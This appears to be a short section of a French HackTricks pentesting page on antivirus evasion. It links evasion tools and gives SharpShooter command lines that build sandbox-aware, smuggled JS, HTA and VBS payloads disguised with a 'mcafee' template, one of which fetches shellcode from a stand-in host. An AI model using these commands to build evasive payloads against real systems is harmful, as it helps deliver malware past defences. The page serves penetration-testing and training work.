### Autres outils
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### Plus

- [https://github.com/persianhydra/Xeexe-TopAntivirusEvasion](https://github.com/persianhydra/Xeexe-TopAntivirusEvasion)


{{#include ../banners/hacktricks-training.md}}
